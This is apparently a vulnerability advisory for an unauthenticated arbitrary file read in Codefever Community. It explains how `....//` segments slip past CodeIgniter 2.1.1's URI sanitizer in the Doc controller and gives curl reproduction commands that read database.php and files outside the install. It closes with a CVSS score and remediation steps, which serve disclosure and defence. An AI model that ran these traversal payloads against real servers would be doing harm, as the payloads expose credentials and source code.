# Codefever Community Directory Traversal (CodeIgniter 2.1.1)

**CWE-22 · Unauthenticated · Arbitrary file read via the Doc controller URI path (`....//` sanitizer-reordering bypass)**

> **Vendor:** PGYER
> **Product:** Codefever Community (CodeIgniter 2.1.1)
> **Affected version:** master branch, latest as of 2026-09-30 (commit 0c35e60); no official release version
> **Affected endpoints:** `GET /doc/<lang>/<traversal-path>` (e.g. `/doc/cn/`, `/doc/en/`) → `application/controllers/doc.php::_detail()`; `_assets()` shares the same sink
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The public documentation route `GET /doc/<lang>/<path>` is handled by `application/controllers/doc.php::_detail()`: the CodeIgniter URI string is taken verbatim and re-joined into a filesystem path (`$docFile = $rootDir . implode('/', array_slice($segments, 2))`) with **no `realpath()`/`basename()` containment**, then read with `file_get_contents()` and echoed into the doc view. The route requires no authentication. CodeIgniter 2.1.1's URI sanitizer (`str_replace(array('//','../'), '/', ...)` in `system/core/URI.php:222`) collapses literal `../` segments, but the sequential application of `str_replace` patterns can be **reordered**: `....//` segments re-form `../` *after* the sanitizer has run, yielding a full unauthenticated arbitrary file read (verified 6 hops beyond the repository root).

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `application/controllers/doc.php` | 39-44 | `_detail()` — URI string → filesystem path, no containment |
| `application/controllers/doc.php` | 51 | `file_exists($docFile)` — accepts any existing path |
| `application/controllers/doc.php` | 99 | `file_get_contents($docFile)` echoed into the doc view |
| `application/controllers/doc.php` | 118-133 | `_assets()` — same unsanitized `$docFile` via `finfo`/`fopen`/`echo` |
| `system/core/URI.php` | 222 | CI 2.1.1 sanitizer — `str_replace(array('//','../'), '/', ...)` |

```php
// application/controllers/doc.php (_detail)
$path    = $this->uri->uri_string;                    // L39 - raw URI
$segments = explode('/', $path);                      // L40
$rootDir  = implode('/', [dirname(APPPATH), 'doc', $docPath]) . '/';  // L42
$docDir   = array_slice($segments, 2);                // L43
$docFile  = $rootDir . implode('/', $docDir);         // L44 - NO containment check
...
$this->load->view('doc/detail', [ ..., 'doc' => str_replace('`','\\`', file_get_contents($docFile)) ]); // L99
```

Why the naive `../` payload fails and `....//` works — CI 2.1.1 sanitizes with sequential `str_replace` passes:

```text
input segment:      ....//....//
pass 1 ('//' -> '/'):  ...../...../      (each '//-' collapsed first)
pass 2 ('../' -> '/'):  ../../../         (traversal RE-FORMED after sanitization)
```

- `permitted_uri_chars` (application/config/config.php:129) includes `.`, so dot segments pass `_filter_uri`.
- `Base::__construct` never enforces login — the route is fully unauthenticated.

## 3. Prerequisites

- None. No authentication, no configuration, no victim interaction — a single GET request.
- The fronting SAPI must pass dot-segments to PHP un-normalized (`php -S` and Apache `PATH_INFO` do; request with `curl --path-as-is`).

## 4. Reproduction

```bash
# 2 hops: read a configuration file outside the web docroot (inside the repo)
curl --path-as-is 'http://<host>/doc/cn/....//....//application/config/database.php'
# -> HTTP 200, raw file content embedded in the application's doc view

# 6 hops: escape the repository root entirely - arbitrary absolute-depth read
curl --path-as-is 'http://<host>/doc/cn/....//....//....//....//....//....//<target-file>'
```

Confirmed results (unmodified application, real routing/controllers/views):

- `/doc/cn/....//....//application/config/database.php` → HTTP 200, the raw `database.php` text rendered inside the app's own doc view wrapper (`div.doc-content` present).
- 6-hop variant → HTTP 200 with the content of an arbitrary file on the same drive (verified reading a file outside the installation directory).
- Naive literal `../` payload → does NOT fire: the Doc constructor redirects slash-less paths and CI collapses `../` in `URI.php:222` before `uri_string` is built.
- Encoded variant `/doc/cn/..%2f..%2f...` → NOT exploitable on this stack (CI 2.1.1 never URL-decodes URI segments).

## 5. Confirmed Techniques

- `....//` str_replace-reordering bypass (2 and 6 hops), `curl --path-as-is`, no cookies sent.
- `file_exists()` gating passes for any existing path; content echoed verbatim inside the doc view.
- `_assets()` branch (doc.php:118-133) shares the same unsanitized `$docFile` (reached when the basename matches `/^\w{32}\.png$/`) — same root cause, not separately exercised.

## 6. Impact

- An unauthenticated attacker reads arbitrary files on the web server's drive: source code, configuration files, and any secrets readable by the PHP user.
- In the shipped Docker deployment, `env.yaml` holding database credentials sits exactly at the traversed location; `/etc/passwd` and application sources are readable.
- Read-only primitive (no write/delete via this sink).

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (Base 7.5 High)

## 8. Remediation

- After building `$docFile`, verify containment: `str_starts_with(realpath($docFile), realpath($rootDir))` and reject the request otherwise.
- Reject any URI segment containing `..` before `implode()` (in addition to, not instead of, the realpath check).
- Apply the same containment to the `_assets()` branch.

## 9. References

- Project: https://github.com/PGYER/codefever
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- Distinct from CVE-2023-26817 (RCE) and CVE-2023-44080 (branchList) — different files and root causes
- External disclosure: [GIST_URL]
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
